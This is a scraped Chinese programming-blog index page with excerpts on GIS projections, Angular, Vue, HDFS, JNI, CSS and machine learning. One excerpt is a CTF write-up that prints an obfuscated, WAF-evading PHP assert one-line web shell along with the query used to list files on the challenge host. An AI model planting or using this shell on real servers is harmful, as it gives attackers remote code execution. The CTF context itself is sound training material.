Web Mercator Web Mercator：在ArcGIS10中有三种EPSG编号，分别是EPSG3857 、EPSG102100、EPSG102113。三者其实表示同一个投影。
Web Mercator 基于WGS-84椭球体，采用的投影方法不是严格意义的墨卡托投影，而是一个被 EPSG称为伪墨卡托（Pseudo-Mercator）的投影方法，这个伪墨卡托投影方法的大名是 Popular Visualization Pseudo Mercator，PVPM。
其投影原理是：在投影过程中，将表示地球的参考椭球体近似的作为正球体处理（正球体半径 R = 椭球体半长轴 a）。ArcGIS 中这个坐标系叫 WGS 1984 Web Mercator (Auxiliary Sphere)。
Web Mercator由谷歌地图最先使用，后来在Web地图领域被广泛使用，已成为目前各大互联网地图公司采用的基准。
因此，GPS等采用WGS84常规投影（也就是UTM）的数据，须得经过坐标转换才能加载到谷歌、必应等网络地图上，否则会出现偏差。
【注】
天地图采用CGCS2000坐标系，如果是严格按照测量领域来，应该是采用高斯-克吕格投影，是UTM的一种变形。
百度坐标采用火星坐标系，出于测绘电子地图涉密方面的考虑，而在原有坐标上进行了偏移。
参考 Web Mercator部分参考如下：（原博文对坐标投影的讲述更为详细）
https://www.cnblogs.com/arxive/p/6103358.html?utm_source=itdadao&amp;utm_medium=referral
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fdf4cc437dad3e5e25bc0dde51b3d32/" rel="bookmark">
			使用ng-alain遇到的一些问题和总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近一个项目是用springboot作为后台框架，angular作为前端框架的方式进行开发的，之前一直想找一个比较好使的前端模板框架来使用，因为不懂ui也不擅长去修改样式啥的，希望侧重于现有工具的使用，更多的进行业务的开发而不是样式的调整。ng-alain是阿里出品的，之前也想用layUI，但是网上有说angular跟layUI搭配使用的话会有一些比较麻烦的问题，比如说事件的监听啥的不好触发，当然我自己没去测试，最后选到了ng-alain，其实还有一个ng-zorro，ng-alain是在ng-zorro的基础上多封装了一下，更倾向于配置的模式进行开发，我两个都有用到，但仅限于用到的控件。废话很多。。。
第一个问题： 使用ng-zorro的list组件的html页面的数据是从是ts文件的一个数组中获取的，比如说datas[...]，想要往datas[]
添加数据时，如果是直接往datas[ ]里面push数据的话，数据是不会到 datas[] 的，我们需要新建一个临时的变量数组，比如说datasCopy[ ], 先往datasCopy[ ] push完数据后，再将datasCopy[ ] 赋给datas[...]，html页面再从这个数据源获取数据，这样才会生效；
第二个问题：使用angular的前端代码要放到springboot项目里面的话，需要使用ng build构建，构建后的代码默认是会放在跟src或node_modules同级的dist文件夹里面，再拷贝dist文件夹到springboot 项目的resource下的templates文件夹里面的，这里想要说的并不是怎么在springboot中配置这个dist的问题，而是在两种build方式下我遇到的一个问题，挺坑的。
ng-alain框架有自带的登录页面，这个页面的登录操作链接可以使用框架的mock数据登录，也可以是使用映射到springboot后台的接口进行登录，因为我之前还没有去写这个接口，所以一直都是使用ng-alain的mock数据直接登录的，然后我一直用ng build的指令打包成dist到springboot项目中使用，一直没有出现什么问题，但是最后有几次我用的是ng build --prod --aot这个指令的方式进行打包dist，dist文件放到springboot项目中运行起来后，卡在登录页面上，无法用ng-alain默认的初始账号密码登录，这个让我觉得很奇怪，因为之前一直都没有出过这样的问题。
其实原因挺简单的，就是build的方式决定了是否使用mock数据，而ng-alain的模拟登录的账号密码是放在_mock文件夹的user.ts中的，ng build --prod --aot的打包方式，不会将这个mock文件夹打包进去，而ng build的方式会，这就是我用前者的方式打包时无法使用模拟账户的原因。
最后我是自己写了一个后端的接口用来做登录的操作，仍然使用ng build --prod --aot的打包方式。这里其实还有另外一种解决的办法继续使用mock数据，在ng-alain框架里面有一个delon.module.ts文件，这个文件里面有几行代码：
import { environment } from '@env/environment'; const MOCK_MODULES = !environment.production ? [DelonMockModule.forRoot({ data: MOCKDATA })] : []; 这里的const MOCK_MODULES = !environment.production ? [DelonMockModule.forRoot({ data: MOCKDATA })]: [];意思就是当
!environment.production时，也就是环境不是生产环境时使用模拟数据，反之不使用，而environment.production属性就定义在ng-alain的environments文件夹的environment.prod.ts和environment.ts中：
// This file can be replaced during build by using the `fileReplacements` array.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fdf4cc437dad3e5e25bc0dde51b3d32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c40ad9cdf020bf33f1f1ac5124ba077b/" rel="bookmark">
			ArcGIS地图服务的发布
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
常用的服务分为动态地图服务和瓦片地图服务两类。其中，动态地图在用户发出请求时进行绘制，而瓦片地图服务通过加载发布的瓦片（图片）来显示地图。
动态地图发布 第一步：准备好预发布的地图。在ArcMap中打开地图，设置好相关参数及图层属性。
第二步：文件 —共享于—发布，选择“发布服务”，下一步。
第三步：Choose a connection中点击+号，选择“Pulish GIS services”，下一步。
【注：若之前发布过服务，则可以在下拉列表中选择已有的】
第四步：输入ServerURL，例如：http://localhost:6080/arcgis，或者http://【IP地址】:6080/arcgis
Server Type 选择ArcGIS Server；
输入arcgisserver的用户名和密码。
【为方便记忆，用户名:admin，密码设为:arcgisserver】
点击finish，下一步。
第五步：选择存储目录：选择根目录，或者新建文件夹，单击继续。
【此处为arcgis server下的目录，】
第六步：单击分析，然后发布。
第七步：打开并登录服务管理器（http://localhost:6080/arcgis/manager/），查看发布的服务。
第八步：ArcMap中新建空白项目，右侧展开Catalog界面，在GIS Servers节点中可以找到刚刚发布的地图服务，直接把它拖入地图视图框，就可以直接使用该地图服务。
切片地图发布 第一步：文件 —— 共享为 —— 服务，点击“发布服务”
第二步：建立连接。【若先前发布过，可直接在下拉列表选择】
。。。。
前五步与动态地图发布相同。
第六步：缓存 ：using tiles from a cache
Cache Settings:Suggest，设置缓存级别。【这里设置的3】
【 当设置的级别越多时，缓存的大小基本成几何倍数增长。】
第七步：分析、发布、确定。
第八步：硬盘查看缓存。
第九步：打开并登录服务管理器（http://localhost:6080/arcgis/manager/），查看发布的服务。
第十步：ArcMap中新建空白项目，右侧展开Catalog界面，在GIS Servers节点中可以找到刚刚发布的地图服务，直接把它拖入地图视图框，就可以直接使用该地图服务。
两种服务描述的差别 （1）类型
（2）地图缓存
（3）比例尺
参考：
【1】https://blog.csdn.net/yinjun151/article/details/79433164
【2】https://blog.csdn.net/LoveCarpenter/article/details/52459660
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/576f56b020eba05e31fa5ba09e3b63f8/" rel="bookmark">
			vue elment-ui render中input为undefined  input-number也没有对应值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		this.tableData.col.forEach(item =&gt; { if (item.prop === 'count') { item.render = (h, params) =&gt; { let count = 9 return ( &lt;div&gt;{params.row.count} &lt;el-input-number v-model={params.row.count}&gt;&lt;/el-input-number&gt; &lt;/div&gt; ) } } }) 问题描述：
获取不到对应的值 更改值更是不能实现 将el-input-number 换成input 出现了 ‘undefined’
这样我们就要安装
babel-plugin-jsx-v-model （http://npm.taobao.org/package/babel-plugin-jsx-v-model）
安装后在.babelrc的插件下加上‘jsx-v-model’
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69f766f2448115b385d67433cdabc1e9/" rel="bookmark">
			解决git官网下载不了windows版本的git安装文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		进入git官网 https://git-scm.com/
选择与自己电脑对应的版本，进行下载。如果下载失败，服务器请求失败，解决办法：在该页面按 F12，再点击图片里面的箭头，复制链接到自己的下载软件里面，比如我的是迅雷。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc9198784f1da16be390e9602ae43611/" rel="bookmark">
			Bugku-CTF之过狗一句话（送给大家一个过狗一句话）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Day25 过狗一句话 http://123.206.87.240:8010/
送给大家一个过狗一句话
&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt;
本题要点：php scandir()函数、assert代码执行漏洞 php中读取目录下文件的方法： 最简单的是print_r(scandir($dir))，还可以利用print_r(glob("*.*")) scandir() //作用能扫描文件夹下的目录和文件，返回值为所有文件名组成的一个数组 show_source() //显示文件源码 highlight_file() //和show_source()函数是一个意思 看题目~ 构造： http://123.206.87.240:8010/ ?s=print_r(scandir('./')) 访问的时候就成为 http://123.206.87.240:8010/?s=print_r(scandir(%27./%27)) 则直接获取里面的内容 http://120.24.86.145:8010/ flag_sm1skla1).txt 得到flag BUGKU{bugku_web_009801_a} 完成！ 参考资料： php读取目录及子目录下所有文件名的方法 http://www.php.cn/manual/view/4514.html https://www.jb51.net/article/56468.htm/
http://www.w3school.com.cn/php/func_directory_scandir.asp
转载于:https://www.cnblogs.com/0yst3r-2046/p/10781215.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e667507acfaff25415b378c30e283ce/" rel="bookmark">
			JZ2440 S3C2440 开发板开发步骤 之 uboot烧录 参数设置  裸机烧录 kernel烧录（openJTAG oflash usb 串口 dnw tftp nfs ）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刚接触JZ2440开发板的通过看视频就知道怎么下载程序和各个开发步骤，但是已经过了好几年,至少快三年了，有些东西也忘记得差不多了，今天稍用很快的速度快进方式看了下视频，回忆起了一点，但不全部看完，此处了根据自己的经验和理解记录，当然为了以后可以快速回忆，因此写下这个博客，当作以后查阅的资料，也帮助一些入门者当参考，有不对的地方欢迎指正提出。另外最后的tftp部分是根据已经整理的资料直接贴上，还没有整理出完整步骤，等后面整理完成在来补充。
一：oflash烧写uboot
如果没有记错在nand falsh 和 nor flash 没有uboot的情况下需要使用oflash下载，这时候只需要接电源和openjtag，连接线如下的，其中的USB线和串口线可以不接
Oflash烧写步骤：
接好线后，上电（不清楚nor/nand flash切换开关要将切换到哪个档位），需先装openJTAG驱动开始菜单，输入cmd，回车打开，弹出命令行窗口 切换到存放oflash的目录，操作如下： 我存放oflash的目录在D盘的D:\Program Files (x86)\oflash下因此需要切换到D盘，在命令行下输入d: 回车
输出cd Program Files (x86)\oflash回车，切换到D:\Program Files (x86)\oflash目录下
使用oflash下载u-boot到开发板 输入oflash u-boot.bin回车，选择openJTAG(输入 0 再次回车) 选择S3C2440，即输入1，再次回车选择Nand Flash prog，即输入0，回车 选择0，回车，这个是再次确认是烧录到Nand Flash prog 输入0，uboot开始烧录 烧录完成后，退出oflash命令，返回到window命令输入行 二、烧写裸机程序
烧写裸机程序和烧写uboot一样，只是将u-boot.bin换成你自己的xxx.bin
三、使用USB烧写kernel
接好线，
安装所需的USB串口驱动以及openJTAG驱动，还有dnw驱动，dnw驱动不是很好装，可能需要安装很久，另外就是确保已经烧写过了uboot。启动开发板，使用secureCRT连接到开发板，这里使用串口连接，File-&gt;connect-&gt; + &gt;serial-&gt;下一步-&gt;com口根据实际选择配置参数-&gt;下一步
按侧面的复位键重新启动开发，在倒计时等于0前按下空格，如果来不及按请重新按复位键，重新启动开发板，然后继续按空格，直到出现下面这个界面，当然截图是截到倒是1秒，只有比0大的数字都可以
输入q，退出菜单，进入参数设置，如果不小心按到其他字母并回车后，可以通过Ctrl+c退出，然后在按q进入Uboot参数配置界面
输入print查看uboot的参数配置情况，我这里已经改过参数因此启动选项里面是nfs启动，如果想要nfs启动就不需要修改了，如果需要从开发板nand flash启动就需要修改，
输入：set bootargs noinitrd root=/dev/mtdblock3 init=/linuxrc console=ttySAC0 回车修改参数
输入：save 回车，保存修改后的参数
输入：reset回车 ，系统自动重新启动
回到刚刚，在uboot启动过程倒计时按下空格进入菜单界面
输入k，进入USB烧录状态，这是屏幕提示USB host is connected. Waiting a download
打开dnw，如果dnw驱动已经安装完成，并且USB线等都没有问题的话，dnw上将线USB:OK,否则不会显示OK,
选择USB port-&gt;transmit
弹出串口选择all file，如果不选择all file，可能看不到你想要的文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e667507acfaff25415b378c30e283ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48dad84ad3fdf6cc4d14cd2c697d2d0f/" rel="bookmark">
			js报错Uncaught ReferenceError: $ is not defined
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本群面相web开发爱好者以及同行，共同探讨研究技术，分享交流经验，帮助新人成长，大牛技术精进，js发展日新月异闭门造车是没有出路的，有问必答，共同进步。求职招聘qq群 626448857
附：web开发资料群 【935069904】
使用tp框架的模板继承时, 子模板 (user.html) 中的main区块中使用到了jq操作,报错Uncaught ReferenceError: $ is not defined 子模板中要继承来之父模板中的jq库，必须放在父模板（base.html）中的 main区块之前 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe6748bb2eba091c7ddb49564c2745c8/" rel="bookmark">
			读书笔记：推荐系统实践-第八章-评分预测问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、离线实验方法 测评目的：找到好的模型小化测试集的RMSE
划分测试集与训练集 和时间无关的预测任务，可以以均匀分布随机划分数据集和时 间相关的任务，那么需要将用户的旧行为作为训练集，将用户的新行为作为测试集 2、评分预测算法 2.1 平均值 全局平均值
用户评分平均值
物品评分平均值
用户分类对物品分类的平均值，物品和用户分类的依据：流行度和活跃度，平均分
2.2 基于邻域的方法 2.2.1 基于用户的邻域方法 2.2.2 基于物品的邻域方法 这里，S(i, K)是和i相似的物品集合，N(u)是用户u评过分的物品集合， wij 是物品之间的相 似度， ri （上横）是物品i的平均分。
计算相似度的方法：
余弦相似度
皮尔逊系数
修正的余弦相似度
2.3 隐语义模型与矩阵分解模型 主要的思想就是：通过降维的方法把评分矩阵补全。
2.3.1 传统的SVD分解 评分矩阵R，维度m*n.
首先，对评分矩阵中的缺失值进行补全，比如用全局平均值，或者用户/物品平均值补全，得到补全后的矩阵R’。
随后，用SVD分解，得到， U 、V是两个正交矩阵， S是对角阵，对角线上的每一个元素都是矩阵的奇异值。
为了对R’进行降维，可以取大的f个奇异值组成对角矩阵Sf，并且找到这f个奇异值中每个值在U、V矩阵中对应的行和列，得到Uf、Vf，从而可以得到一个降维后的评分矩阵。
这个矩阵在u、i索引上的值，就是用户u对物品i的预测值
SVD分解存在的问题：补全后的稀疏矩阵需要存储非常大的空间；SVD分解方法的计算复杂度很高。
2.3.2 Simon Funk的SVD分解 第二章介绍过。这里从矩阵分解的角度再分析一下。
这个方法实际上将矩阵分解，分解成为了两个低维矩阵相乘
P的维度是fm，Q的维度是fn，对于用户u对物品i的评分的预测值可以通过下面的公式得到。
训练的损失函数：
利用随机梯度下降法可以求得P和Q矩阵的数据。另外，对P和Q初始化的时候最好随机数和1/sqrt(F)成正比。
2.4.3 加入偏置项后的LFM （BiasSVD） 加入了三个项，分别是：
μ 训练集中所有记录的评分的全局平均数bu 用户偏置（user bias）项。这一项表示了用户的评分习惯中和物品没有关系的那种因素bi 物品偏置（item bias）项。这一项表示了物品接受的评分中和用户没有什么关系的 因素。 2.4.4 考虑邻域影响的LFM SVD++ 将原本的基于邻域的方法，该成一个可学习的模型，利用损失函数和梯度下降来优化参数：
考虑到w可能需要太多的存储空间，可以尝试降维成两个矩阵，每个矩阵的维度为n*F，一共2nF个参数。
引入偏置项：
进一步，降低维度，令x=q，得到最终的SVD++
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe6748bb2eba091c7ddb49564c2745c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2ae71985f849e8bb281e6139444aa6c/" rel="bookmark">
			hdf的基本概念与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本概念 首先，它是一个文件系统，用于存储文件，通过统一的命名空间——目录树来定位文件
其次，它是分布式的，由很多服务器联合起来实现其功能，集群中的服务器有各自的角色；
重要特性如下：
（1）HDFS中的文件在物理上是分块存储（block），块的大小可以通过配置参数( dfs.blocksize)来规定，默认大小在hadoop2.x版本中是128M，老版本中是64M
（2）HDFS文件系统会给客户端提供一个统一的抽象目录树，客户端通过路径来访问文件，形如：hdfs://namenode:port/dir-a/dir-b/dir-c/file.data
（3）目录结构及文件分块信息(元数据)的管理由namenode节点承担
——namenode是HDFS集群主节点，负责维护整个hdfs文件系统的目录树，以及每一个路径（文件）所对应的block块信息（block的id，及所在的datanode服务器）
（4）文件的各个block的存储管理由datanode节点承担
---- datanode是HDFS集群从节点，每一个block都可以在多个datanode上存储多个副本（副本数量也可以通过参数设置dfs.replication）
（5）HDFS是设计成适应一次写入，多次读出的场景，且不支持文件的修改
(注：适合用来做数据分析，并不适合用来做网盘应用，因为，不便修改，延迟大，网络开销大，成本太高)
shell命令行操作放肆 HDFS提供shell命令行客户端，使用方法如下：
命令行客户端支持的命令参数 [-appendToFile &lt;localsrc&gt; ... &lt;dst&gt;] [-cat [-ignoreCrc] &lt;src&gt; ...] [-checksum &lt;src&gt; ...] [-chgrp [-R] GROUP PATH...] [-chmod [-R] &lt;MODE[,MODE]... | OCTALMODE&gt; PATH...] [-chown [-R] [OWNER][:[GROUP]] PATH...] [-copyFromLocal [-f] [-p] &lt;localsrc&gt; ... &lt;dst&gt;] [-copyToLocal [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;] [-count [-q] &lt;path&gt; ...] [-cp [-f] [-p] &lt;src&gt; ... &lt;dst&gt;] [-createSnapshot &lt;snapshotDir&gt; [&lt;snapshotName&gt;]] [-deleteSnapshot &lt;snapshotDir&gt; &lt;snapshotName&gt;] [-df [-h] [&lt;path&gt; .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2ae71985f849e8bb281e6139444aa6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9aa3664976a8d60c477df902365bf125/" rel="bookmark">
			Java语言调用C&#43;&#43; DLL库方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近一个项目要开发网页端人脸识别项目，人脸识别的算法已经写好，是C++版，但是网页端要求使用Java后台，这就涉及到Java调用DLL的问题。经过查找，实现了一个简单的例子。
1、第一步，先在Java中新建一个类
如上图，其中注意这句System.loadLibrary("javaCallcpp");，这就是加载dll文件的代码了。然后我们需要dll中实现下面定义的加减乘除方法。
2、编译文件，文件名为Java2cpp.java，首先编译成class文件，如果用的是eclipse，这个文件已经自动生成了，在工程目录下的bin文件夹下。用命令行编译，打开cmd窗口，cd到.java文件所在目录，执行命令javac Java2cpp.java，即生成Java2cpp.class
然后执行命令javah Java2cpp生成Java2cpp.h头文件，但是这一步往往会失败，另一种方法可以成功，进入eclipse项目的目录，进入bin文件夹，执行命令javah -classpath . -jni 包名.类名(com.test.jni.Java2cpp),然后生成了com_test_jni_Java2cpp.h
3、在VS中新建项目win32项目，命名为：TestJNI第二步选择如下：
4、把第二步生成的头文件拷进项目文件夹，然后导入。
5、实现头文件中的方法：
（1）新建头文件dllApi.h,代码如下：
#include "com_test_jni_Java2cpp.h" int DLL_API_ADD(int a, int b); int DLL_API_SUB(int a, int b); int DLL_API_MUL(int a, int b); int DLL_API_DIV(int a, int b); （2）新建dllApi.cpp实现上述方法，代码如下：
#include "stdafx.h" #include &lt;iostream&gt; #include "dllApi.h" int DLL_API_ADD(int a, int b) { return (a + b); } int DLL_API_SUB(int a, int b) { return (a - b); } int DLL_API_MUL(int a, int b) { return (a*b); } int DLL_API_DIV(int a, int b) { return (a / b); } （3）在TestJNI.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9aa3664976a8d60c477df902365bf125/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63d08f1d47f06061b01133c6360b04d5/" rel="bookmark">
			CSS：好玩的‘伪类’系列之——(:checked)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		:checked 定义：用来修改任何处于选中状态的HTML元素的样式，一般用在input元素的radio、checkbox属性和select元素下的option子元素中
触发条件：当元素的可选项中存在已被选中的情况，修改这些被选中的样式
兼容：基本全兼容
举个栗子
html代码：
&lt;!-- radio --&gt; &lt;input type="radio" name="my-radio" id='yes'&gt; &lt;label for='yes'&gt;yes&lt;/label&gt; &lt;input type="radio" name="my-radio" id='no'&gt; &lt;label for='no'&gt;no&lt;/label&gt; &lt;br/&gt;&lt;br/&gt;&lt;br/&gt; &lt;!-- checkbox --&gt; &lt;input type="checkbox" name="my-checkbox" id='Apple'&gt; &lt;label for='Apple'&gt;Apple&lt;/label&gt; &lt;input type="checkbox" name="my-checkbox" id='Boy'&gt; &lt;label for='Boy'&gt;Boy&lt;/label&gt; &lt;input type="checkbox" name="my-checkbox" id='Car'&gt; &lt;label for='Car'&gt;Car&lt;/label&gt; &lt;input type="checkbox" name="my-checkbox" id='Door'&gt; &lt;label for='Door'&gt;Door&lt;/label&gt; &lt;br/&gt;&lt;br/&gt;&lt;br/&gt; &lt;!-- option --&gt; &lt;select name="my-select" id="games"&gt; &lt;option value="opt0"&gt;&lt;/option&gt; &lt;option value="opt1"&gt;KOF97&lt;/option&gt; &lt;option value="opt2"&gt;Tetris&lt;/option&gt; &lt;option value="opt3"&gt;Street Fighter&lt;/option&gt; &lt;/select&gt; css代码：
label{ cursor: pointer; } input[type='radio']:checked{ box-shadow: 0 0 0 3px red; } input[type='radio']:checked+label{ color: red; } input[type='checkbox']:checked{ box-shadow: 0 0 0 3px blue; } input[type='checkbox']:checked+label{ color: blue; } option:checked { color: red; } 效果图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e6875f755f753ca8dad96f69dfda21c/" rel="bookmark">
			机器学习(十一)-逻辑回归实践篇之鸢尾花数据集分类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 项目描述 使用逻辑回归算法来对鸢尾花进行分类；
数据集包括训练数据train.txt和测试数据test.txt；测试数据中，每个样本包括特定的几个特征参数，最后是一个类别标签，而测试数据中的样本则只包括了特征参数
2 逻辑回归：鸢尾花数据集分类 2.1 鸢尾花数据信息 Sepal length: 花萼长度
Sepal width: 花萼宽度
Petal length: 花瓣长度
Petal width: 花瓣宽度
2.2 鸢尾花分类 2.3 问题描述 如果： 花萼长度，花萼宽度， 花瓣长度，花瓣宽度为5.1, 3.5, 1.4, 0.2
问：是什么花
3 分析问题 3.1 加载数据集 def load_data(): """ 加载数据集 :return: X： 花瓣宽度 Y: 鸢尾花类型 """ # 加载sklearn包自带的鸢尾花数据; iris = datasets.load_iris() # # 查看鸢尾花的数据集 # print(iris) # # 查看鸢尾花的key值； # # dict_keys(['data', 'target', 'target_names', 'DESCR','feature_names', 'filename']) # print(iris.keys()) # # 获取鸢尾花的特性： ['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)'] # print(iris['feature_names']) # print(iris['data']) # print(iris['target']) # 因为花瓣的相关系数比较高， 所以分类效果比较好， 所以我们就用花瓣宽度当作x; X = iris['data'][:, 3:] # 获取分类的结果 Y = iris['target'] return X, Y 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e6875f755f753ca8dad96f69dfda21c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9caf3ed9b31ba3adb886342d4b8114a1/" rel="bookmark">
			本人辛苦写作文章被简书锁定，被逼退出简书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人花费3天写作的博客《目标检测实践_keras版YOLOv3训练自己的数据》被简书锁定，读者无法查看。
文章链接：https://www.jianshu.com/p/f9ab6427ee97
本人申请解封次数超过3次，均未通过审核，且没有被告知锁定的原因，无奈只能放弃这个坚持写作1年多的平台。
本人之后会逐渐将文章迁移至github，本人github工程页面：https://github.com/StevenLei2017/AI_Projects
同时因为个人时间有限，要求我帮助过的读者或者欢迎其他读者协助我，完成文章的重新编辑，并迁移到github页面。
本人联系方式，QQ：474933858
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64f9c596de0c19830ba02efd8ec6be35/" rel="bookmark">
			java身份证号码验证是否有效，校验是否成年
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Calendar; import java.util.GregorianCalendar; import java.util.Hashtable; import java.util.regex.Matcher; import java.util.regex.Pattern; /** * 身份证好码验证 */ public class IDCardUtils { /** * 功能：身份证的有效验证 * * @param IDStr 身份证号 * @return true 有效：false 无效 * @throws ParseException */ public static boolean IDCardValidate(String IDStr) { String[] ValCodeArr = {"1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2"}; String[] Wi = {"7", "9", "10", "5", "8", "4", "2", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64f9c596de0c19830ba02efd8ec6be35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ca19935ca06d774b170d88a22d4b30e/" rel="bookmark">
			学习笔记一：ArcGIS for Javascript 添加图层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言理论知识AMD和Legacy 添加图层功能实现完整代码显示效果 前言 因工作原因在学习ArcGIS编程开发，但遗忘问题比较严重，一是因各种原因难以做到持续不断的学习，而有些代码间隔两三天再来用会出现各种问题；二是学了后面忘记前面，在有源码的情况能看懂，但没有源码自己写不出来或者写出来了各种bug，又得重新学习。因此希望以博客方式来记录和积累自己的学习。
本文原本需要实现的功能是：通过输入图层链接的方式动态添加图层。目前本文仅实现了在代码内进行矢量图层添加，后续将逐步完善功能和内容。
理论知识 AMD和Legacy 无论是AMD Module Require或是Legacy Module Require，其作用都是模块引用，通过require方法实现代码的模块化加载，便于代码的编写和维护。主要区别在于引入模块的方式差异，从而导致了在使用和写法上存在差异。在ArcGIS API for JavaScript官网（本文基于API 3.28版本）上同时提供了两者写法的范例，如下图。
两种方法中，Legacy Module Require是较老的传统写法，AMD是目前常用方法及官方推荐写法。如果是基于比较老的项目，很大可能会用到Legacy Module Require方法，但目前网上能找的范例比较少。
以实现简单地图功能为例，两种方式分别如下：
AMD方式：
require([ "esri/map" ], function(Map) { var map = new Map("map", {basemap:"topo" }); }); Legacy方式：
dojo.require("esri.map"); function init() { var map = new esri.Map("map",{basemap:"topo" }); } dojo.addOnLoad(init); 添加图层功能实现 核心部分：
&lt;script type="text/javascript"&gt; require([ "esri/map", "esri/layers/ArcGISDynamicMapServiceLayer" ],function(Map,ArcGISDynamicMapServiceLayer){ var map = new Map("map",{ basemap:"topo", center:[-100,45], zoom:3 }); var DynamicLayer = new ArcGISDynamicMapServiceLayer("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ca19935ca06d774b170d88a22d4b30e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8764e04d3c5dad079e9caa10e90d81f2/" rel="bookmark">
			Linux安装VMware Tools
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux安装VMware Tools 为了方便在虚拟机中复制粘贴，安装WMware Tools
点击菜单栏–&gt;虚拟机–&gt;安装VMware Tools。
进入linux主机，打开终端。
进入/media/VMware Tools目录
[root@localhost ~]# cd /media/VMware\ Tools/ 将这个目录下VMwareTools-10.0.5-3228253.tar.gz文件复制到/tmp目录下，然后切换到/tmp目录执行解压。
[root@localhost VMware Tools]# cp VMwareTools-10.0.5-3228253.tar.gz /tmp [root@localhost tmp]# tar -zxvf VMwareTools-10.0.5-3228253.tar.gz 解压完成后看到目录下面又多了个vmware-tools-distrib目录
进入vmware-tools-distrib目录，执行该目录下的vmware-install.pl文件，然后一路回车就行
[root@localhost tmp]# cd vmware-tools-distrib/ [root@localhost vmware-tools-distrib]# ./vmware-install.pl Creating a new VMware Tools installer database using the tar4 format. Installing VMware Tools. In which directory do you want to install the binary files? [/usr/bin] What is the directory that contains the init directories (rc0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8764e04d3c5dad079e9caa10e90d81f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9b3b81085d8d739db030a6bb0c8684a/" rel="bookmark">
			Vue利用v-for语句&#43;自定义排序函数实现data内数据按照age列自动排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
